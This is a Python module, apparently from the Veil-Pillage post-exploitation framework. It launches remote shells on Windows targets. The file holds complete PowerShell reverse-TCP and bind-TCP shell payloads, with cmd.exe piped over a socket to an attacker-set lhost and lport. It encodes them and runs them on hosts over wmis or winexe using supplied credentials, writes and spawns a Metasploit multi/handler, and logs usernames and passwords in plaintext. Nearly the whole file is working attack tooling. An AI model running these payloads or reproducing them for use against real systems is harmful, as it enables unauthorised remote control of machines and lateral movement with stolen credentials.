"""

Invokes a reverse or bind shell on a target (rev_tcp or bind_tcp)

These powershell scripts are taken from the Social-Engineer-Toolkit
    All credit to Josh Kelley (winfang) and Dave Kennedy (ReL1K)
	https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell
    https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/bind.powershell

Cleanup-> powersploit/kill-scripts


Module built by @harmj0y

"""

import sys, base64, re, time, os


from lib import helpers
from lib import messages
from lib import smb
from lib import command_methods
import settings

# Veil-Evasion import for shellcode generation
from modules.payloads.powershell.shellcode_inject import virtual

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Powershell Shell"
        self.description = "Invoke a bind or reverse shell on a target using powershell."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"   : ["wmis", "[wmis] or [winexe] for triggering"],
                                    "shell"            : ["rev_tcp", "[rev_tcp] or [bind_tcp]"],
                                    "spawn_handler"    : ["false", "spawn a handler for rev_tcp"],
                                    "lhost"            : ["none", "lhost for rev_tcp"],
                                    "lport"            : ["4444", "lport for rev_tcp/bind_tcp"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        shell = self.required_options["shell"][0]
        lhost = self.required_options["lhost"][0]
        lport = self.required_options["lport"][0]
        spawnHandler = self.required_options["spawn_handler"][0]

        # start building the handler in case we want to invoke it
        handler = "use exploit/multi/handler"

        # the pure powershell windows_reverse_tcp shell
        revTCPShell = """function cleanup {
if ($c.Connected -eq $true) {$c.Close()}
if ($p.ExitCode -ne $null) {$p.Close()}
exit}
$c = New-Object system.net.sockets.tcpclient
$c.connect('%s','%s')
$stream = $c.GetStream()
$n = New-Object System.Byte[] $c.ReceiveBufferSize
$p = New-Object System.Diagnostics.Process
$p.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$p.StartInfo.RedirectStandardInput = 1
$p.StartInfo.RedirectStandardOutput = 1
$p.StartInfo.UseShellExecute = 0
$p.Start()
$is = $p.StandardInput
$o = $p.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($o.Peek() -ne -1){$out += $encoding.GetString($o.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false;
while (-not $done) {
if ($c.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $n.Length)) {
$read = $stream.Read($n,$pos,$n.Length - $pos)
$pos+=$read; if ($pos -and ($n[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($n,0,$pos)
$is.write($string)
start-sleep 1
if ($p.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($o.Read())
while($o.Peek() -ne -1){
$out += $encoding.GetString($o.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}""" %(lhost, lport)

        bindTCPShell = """$en = new-object System.Text.AsciiEncoding
$ep = new-object System.Net.IpEndpoint ([System.Net.Ipaddress]::any, "%s")
$l = new-object System.Net.Sockets.TcpListener $ep
$l.start()
$socket = $l.AcceptTcpClient()
$ns = $socket.GetStream()
$nb = New-Object System.Byte[] $socket.ReceiveBufferSize
$p = New-Object System.Diagnostics.Process 
$p.StartInfo.FileName = "C:\\windows\\system32\\cmd.exe"
$p.StartInfo.RedirectStandardInput = 1
$p.StartInfo.RedirectStandardOutput = 1
$p.StartInfo.UseShellExecute = 0
$p.Start()
$is = $p.StandardInput
$os = $p.StandardOutput
Start-Sleep 1
while($os.Peek() -ne -1){ $string += $en.GetString($os.Read())}
$ns.Write($en.GetBytes($string),0,$string.Length)
$string = '' 
$done = $false
while (-not $done) {
    $pos = 0
    $i = 1
    while (($i -gt 0) -and ($pos -lt $nb.Length)) {
                    $read = $ns.Read($nb,$pos,$nb.Length - $pos)
        $pos+=$read
        if ($pos -and ($nb[0..$($pos-1)] -contains 10)){break}}
    if ($pos -gt 0) {
        $string = $en.GetString($nb,0,$pos)
        $is.write($string)
        $out = $en.GetString($os.Read())
        while($os.Peek() -ne -1){$out += $en.GetString($os.Read())}
        $ns.Write($en.GetBytes($out),0,$out.length)
        $out = $null} else {$done = $true}}
        """ %(lport)

        # if the user specific a reverse_tcp shell
        if shell.lower() == "rev_tcp":
            # make sure we have lhost filled in
            if lhost == "none":
                print helpers.color(" [!] 'lhost' required for rev_tcp! ", warning=True)
                raw_input("\n [>] Press enter to continue: ")
                return ""

            # get the encoded powershell trigger command
            triggerCMD = helpers.encPowershell(revTCPShell)
            handler += "\nset PAYLOAD windows/shell_reverse_tcp"
            handler += "\nset LHOST " + lhost
            handler += "\nset LPORT " + lport
            handler += "\nset ExitOnSession false"
            handler += "\nexploit -j\n"
            f = open('/tmp/handler.rc', 'w')
            f.write(handler)
            f.close()

            # build and spawn a handler for the reverse shell
            if spawnHandler.lower() == "true":
                handlerPath = "/tmp/handler.rc"
                # command to spawn a new tab
                cmd = "gnome-terminal --tab -t \"Veil-Pillage Handler\" -x bash -c \"echo ' [*] Spawning Metasploit handler...' && msfconsole -r '" + handlerPath + "'\""
                # invoke msfconsole with the handler script in a new tab
                os.system(cmd)
                raw_input("\n\n [>] Press enter when handler is ready: ")

        # bind_tco shell is easier :)
        elif shell.lower() == "bind_tcp":
            triggerCMD = helpers.encPowershell(bindTCPShell)
        else:
            print helpers.color("\n [!] Shell not recognized: please enter rev_tcp or bind_tcp\n", warning=True)
            raw_input("\n [>] Press enter to continue: ")
            return ""

        # execute the powershell trigger command on each target
        for target in self.targets:
            # trigger the command and set output as appropriate
            print "\n [*] Triggering powershell shell '"+shell.lower()+"' with lhost="+lhost+" and lport="+lport+" on "+target
            self.output += "[*] Triggering powershell shell '"+shell.lower()+"' with lhost="+lhost+" and lport="+lport+" using creds '"+username+":"+password+"' on "+target+"\n"
            command_methods.executeCommand(target, username, password, triggerCMD, triggerMethod)

             # build our cleanup file -> kill all powershell processes
            killCMD = "taskkill /f /im powershell.exe"
            self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+killCMD+"|"+triggerMethod+"\n"

